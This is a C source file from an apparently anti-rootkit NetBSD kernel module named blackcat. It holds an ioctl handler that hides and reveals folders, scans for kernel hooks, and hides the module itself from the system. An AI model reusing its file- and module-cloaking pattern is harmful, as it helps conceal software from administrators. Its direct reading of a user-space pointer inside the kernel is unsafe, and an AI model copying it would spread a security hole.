/*
 *                          Copyright (C) 2018 by Rafael Santiago
 *
 * Use of this source code is governed by GPL-v2 license that can
 * be found in the COPYING file.
 *
 */

#include <netbsd/cdev_ioctl.h>
#include <netbsd/cdev_deinit.h>
#include <netbsd/scan_hook.h>
#include <defs/types.h>
#include <defs/io.h>
#include <icloak.h>

int cdev_ioctl(dev_t dev, u_long cmd, void *u_addr, int flag, struct lwp *lp) {
    int errno = 0;
    size_t data_size;
    char temp[4096];

    switch (cmd) {
        case BLACKCAT_BURY_FOLDER:
        case BLACKCAT_DIG_UP_FOLDER:
            if (u_addr == NULL) {
                return EINVAL;
            }

            data_size = strlen((char *)u_addr);

            if (data_size > sizeof(temp) - 1) {
                return EINVAL;
            }

            memset(temp, 0, sizeof(temp));
            memcpy(temp, (char *)u_addr, data_size);

            errno = (cmd == BLACKCAT_BURY_FOLDER) ? icloak_hide_file(temp) :
                                                    icloak_show_file(temp);

            memset(temp, 0, data_size);
            break;

        case BLACKCAT_SCAN_HOOK:
            errno = scan_hook();
            break;

        case BLACKCAT_MODHIDE:
            if ((errno = icloak_ko(CDEVNAME)) != 0) {
                uprintf("/dev/blackcat: Unable to hide the kernel module.\n");
            }
            break;

        default:
            errno = EINVAL;
            break;
    }

    return errno;
}
